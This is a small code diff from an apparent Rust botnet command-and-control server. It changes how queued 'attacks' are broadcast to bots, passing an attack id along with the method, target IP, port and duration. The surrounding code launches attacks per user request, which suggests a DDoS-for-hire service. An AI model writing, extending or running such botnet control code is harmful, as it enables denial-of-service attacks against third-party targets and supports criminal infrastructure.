@@ -258,7 +258,7 @@ async fn main() -> Result<()> {
                 ).await {
                     Ok(id) => {
                         info!("Started queued attack {} for user {}", id, request.username);
-                        state_clone.bot_manager.broadcast_attack(&request.method, &request.ip.to_string(), request.port, request.duration_secs).await;
+                        state_clone.bot_manager.broadcast_attack(id, &request.method, &request.ip.to_string(), request.port, request.duration_secs).await;
                     }
                     Err(e) => {
                         warn!("Failed to start queued attack: {}", e);
